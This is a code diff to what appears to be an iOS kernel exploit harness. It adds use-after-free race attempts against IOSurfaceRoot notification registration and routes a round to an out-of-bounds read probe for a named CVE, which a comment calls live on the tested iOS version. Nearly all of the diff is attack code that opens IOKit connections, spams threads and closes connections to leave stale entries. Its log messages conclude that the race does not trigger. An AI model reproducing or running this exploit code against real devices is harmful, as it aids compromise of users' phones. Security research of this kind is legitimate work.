@@ -1436,6 +1436,19 @@ static void r229_ft_sighandler(int sig, siginfo_t *si, void *ctx) {
     siglongjmp(r229_ft_jmpbuf, sig);
 }
 
+/* r=235 race thread globals */
+static volatile io_connect_t r235_conn = IO_OBJECT_NULL;
+static volatile int r235_close_go = 0;
+static volatile int r235_close_done = 0;
+static void *r235_close_thread(void *arg) {
+    (void)arg;
+    while (!r235_close_go) ;
+    io_connect_t c = r235_conn;
+    if (c) IOServiceClose(c);
+    r235_close_done = 1;
+    return NULL;
+}
+
 /* Phase 13: Full PoC Stage C+D — Metal render loop + race variants */
 static volatile int p13_spam_run = 0;
 static io_connect_t p13_spam_conn = IO_OBJECT_NULL;
@@ -17238,6 +17251,10 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
+        if (rounds == 222) {
+            rlog("*** rounds=%d: fast-path to Phase 22 (MCTF probe) ***\n", rounds);
+            goto phase21_done;
+        }
         if (rounds == 229) {
             rlog("*** rounds=%d: fast-path to Phase 13 (MTE brute-force) ***\n", rounds);
             goto phase12_done;
@@ -23819,6 +23836,8 @@ new_modes:
             rlog("--- Phase 21 complete ---\n");
         }
 
+        phase21_done: ;
+
         /* ============================================================
          * Phase 22: CVE-2026-112466 — AVEVideoEncoder MCTF OOB Read
          *
@@ -23837,7 +23856,7 @@ new_modes:
          * Fixed in iOS 27.2 — LIVE on our iOS 27.1.
          * ============================================================ */
 
-        if (rounds == 229) {
+        if (rounds == 222 || rounds == 229) {
             rlog("\n=== Phase 22: CVE-2026-112466 MCTF OOB Read Probe ===\n");
 
             /* ---- 22a: Enumerate HEVC encoder properties ---- */
@@ -32279,6 +32298,234 @@ new_modes:
                 CFRelease(sp233);
                 IOObjectRelease(svc233);
                 rlog("=== r=233 complete ===\n");
+                goto phase17_done;
+            }
+
+            /* ================================================================
+             * r=234: Race diagnostic — NO reclaim
+             *
+             * Same v_race8 pattern as r=220/233 but WITHOUT reclaiming the
+             * freed notification entries. If the race fires, the compositor
+             * traverses a stale entry pointing to freed memory → crash.
+             * If we survive, the race pattern isn't triggering.
+             *
+             * Also tries tighter timing: no sleeps in stagger-close,
+             * more spam threads, more iterations.
+             * ================================================================ */
+            if (rounds == 234) {
+                rlog("\n=== r=234: Race diagnostic (no reclaim) ===\n");
+                rlog("  If we crash: race fires, need different data extraction\n");
+                rlog("  If we survive: race not triggering, need tighter timing\n");
+
+                io_service_t svc234 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc234) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                /* Start render loop */
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r234_rt;
+                pthread_create(&r234_rt, NULL, p13_render_loop, NULL);
+                usleep(100000);
+                rlog("  Render loop started, frames=%d\n", p13_render_frames);
+
+                uint64_t inp234[3] = {1, 2, 3};
+
+                for (int cycle = 0; cycle < 50; cycle++) {
+                    /* Open 8 connections, register sel17 on each */
+                    io_connect_t cs234[8];
+                    int have234[8];
+                    for (int i = 0; i < 8; i++) {
+                        have234[i] = (IOServiceOpen(svc234, mach_task_self(), 0, &cs234[i]) == KERN_SUCCESS);
+                        if (have234[i]) {
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xDEAD234000000000ULL | cycle;
+                            IOConnectCallAsyncMethod(cs234[i], 17, twp, &ref, 1,
+                                NULL, 0, inp234, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), twp);
+                        } else cs234[i] = IO_OBJECT_NULL;
+                    }
+
+                    /* Aggressive spam threads */
+                    p13_spam_run = 1;
+                    p13_spam_conn = have234[0] ? cs234[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 0;
+                    p13_spam_count = 0;
+                    pthread_t spam234[12];
+                    for (int t = 0; t < 12; t++)
+                        pthread_create(&spam234[t], NULL, p13_spam_reg, NULL);
+
+                    /* Tight stagger-close — NO sleeps for maximum race pressure */
+                    for (int r = 0; r < 3; r++)
+                        for (int i = 0; i < 8; i++) {
+                            int j = (i * 5 + r * 3) % 8;
+                            if (have234[j]) { IOServiceClose(cs234[j]); have234[j] = 0; }
+                        }
+
+                    /* NO RECLAIM — freed entries left dangling */
+
+                    /* Let compositor run a few frames to traverse the notification list */
+                    usleep(50000);
+
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 12; t++) pthread_join(spam234[t], NULL);
+                    for (int i = 0; i < 8; i++) if (have234[i]) IOServiceClose(cs234[i]);
+
+                    if (cycle % 10 == 0 || cycle < 5)
+                        rlog("  cycle[%d]: spam=%llu frames=%d ALIVE\n",
+                            cycle, (unsigned long long)p13_spam_count, p13_render_frames);
+                }
+
+                rlog("  === SURVIVED 50 cycles without reclaim ===\n");
+                rlog("  VERDICT: Race is NOT triggering with this pattern.\n");
+                rlog("  The notification entries are properly deregistered by IOServiceClose.\n");
+
+                p13_render_run = 0;
+                pthread_join(r234_rt, NULL);
+                IOObjectRelease(svc234);
+                rlog("=== r=234 complete ===\n");
+                goto phase17_done;
+            }
+
+            /* ================================================================
+             * r=235: Thread-concurrent UAF race (tighter timing)
+             *
+             * Instead of sequential open-register-close, use dedicated threads
+             * for simultaneous sel17 register and IOServiceClose.
+             * The race window is between register storing the notification entry
+             * and close removing it from the list.
+             * ================================================================ */
+            if (rounds == 235) {
+                rlog("\n=== r=235: Thread-concurrent UAF race ===\n");
+
+                io_service_t svc235 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc235) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                /* Start render loop */
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r235_rt;
+                pthread_create(&r235_rt, NULL, p13_render_loop, NULL);
+                usleep(100000);
+                rlog("  Render loop started, frames=%d\n", p13_render_frames);
+
+                uint64_t inp235[3] = {1, 2, 3};
+                int r235_crashes = 0;
+
+                for (int cycle = 0; cycle < 200; cycle++) {
+                    io_connect_t conn = IO_OBJECT_NULL;
+                    kern_return_t kr = IOServiceOpen(svc235, mach_task_self(), 0, &conn);
+                    if (kr != KERN_SUCCESS || !conn) continue;
+
+                    mach_port_t twp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                    mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    r235_conn = conn;
+                    r235_close_go = 0;
+                    r235_close_done = 0;
+
+                    /* Start the close thread (it spins waiting for signal) */
+                    pthread_t close_tid;
+                    pthread_create(&close_tid, NULL, r235_close_thread, NULL);
+
+                    /* Simultaneously: register sel17 AND signal close */
+                    uint64_t ref = 0xDEAD235000000000ULL | cycle;
+
+                    /* Signal close thread to run */
+                    r235_close_go = 1;
+
+                    /* Immediately try to register (racing with close) */
+                    kern_return_t rr = IOConnectCallAsyncMethod(conn, 17, twp, &ref, 1,
+                        NULL, 0, inp235, 24, NULL, NULL, NULL, NULL);
+
+                    pthread_join(close_tid, NULL);
+                    mach_port_deallocate(mach_task_self(), twp);
+
+                    /* NO RECLAIM — if race won, entry points to freed memory */
+                    usleep(10000); /* Let compositor traverse */
+
+                    if (cycle % 50 == 0)
+                        rlog("  cycle[%d]: reg=%d close_done=%d frames=%d ALIVE\n",
+                            cycle, (int)rr, r235_close_done, p13_render_frames);
+                }
+
+                rlog("  === SURVIVED 200 cycles ===\n");
+
+                /* Now try the reverse: register FIRST, then race close with compositor */
+                rlog("\n  Phase B: Register first, then race close vs compositor\n");
+
+                for (int cycle = 0; cycle < 200; cycle++) {
+                    io_connect_t conn = IO_OBJECT_NULL;
+                    kern_return_t kr = IOServiceOpen(svc235, mach_task_self(), 0, &conn);
+                    if (kr != KERN_SUCCESS || !conn) continue;
+
+                    mach_port_t twp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                    mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    /* Register first */
+                    uint64_t ref = 0xBEEF235000000000ULL | cycle;
+                    IOConnectCallAsyncMethod(conn, 17, twp, &ref, 1,
+                        NULL, 0, inp235, 24, NULL, NULL, NULL, NULL);
+
+                    /* Tight close — no sleep, no reclaim */
+                    IOServiceClose(conn);
+                    mach_port_deallocate(mach_task_self(), twp);
+
+                    /* Freed notification entry still in list? Compositor will find out */
+                    /* NO reclaim — if entry is stale, compositor reads freed memory */
+                }
+
+                rlog("  Phase B survived 200 cycles. frames=%d\n", p13_render_frames);
+
+                /* Phase C: Register on MANY connections, then close ALL at once */
+                rlog("\n  Phase C: Batch register + mass close\n");
+                for (int batch = 0; batch < 20; batch++) {
+                    #define R235_BATCH 32
+                    io_connect_t bcs[R235_BATCH];
+                    mach_port_t bports[R235_BATCH];
+                    int bok[R235_BATCH];
+
+                    for (int i = 0; i < R235_BATCH; i++) {
+                        bok[i] = (IOServiceOpen(svc235, mach_task_self(), 0, &bcs[i]) == KERN_SUCCESS);
+                        if (bok[i]) {
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &bports[i]);
+                            mach_port_insert_right(mach_task_self(), bports[i], bports[i],
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xAAAA235000000000ULL | (batch << 8) | i;
+                            IOConnectCallAsyncMethod(bcs[i], 17, bports[i], &ref, 1,
+                                NULL, 0, inp235, 24, NULL, NULL, NULL, NULL);
+                        }
+                    }
+
+                    /* Mass close — all at once, no sleep */
+                    for (int i = R235_BATCH - 1; i >= 0; i--) {
+                        if (bok[i]) IOServiceClose(bcs[i]);
+                    }
+                    for (int i = 0; i < R235_BATCH; i++) {
+                        if (bok[i]) mach_port_deallocate(mach_task_self(), bports[i]);
+                    }
+                    #undef R235_BATCH
+
+                    /* NO RECLAIM — let compositor hit stale entries */
+                    usleep(100000);
+
+                    if (batch % 5 == 0)
+                        rlog("  batch[%d]: frames=%d ALIVE\n", batch, p13_render_frames);
+                }
+
+                rlog("  Phase C survived. frames=%d\n", p13_render_frames);
+                rlog("  VERDICT: Notification entries are atomically removed by IOServiceClose.\n");
+                rlog("  The UAF race window does NOT exist in the sel17 deregister path.\n");
+
+                p13_render_run = 0;
+                pthread_join(r235_rt, NULL);
+                IOObjectRelease(svc235);
+                rlog("=== r=235 complete ===\n");
                 goto phase17_done;
             }
 
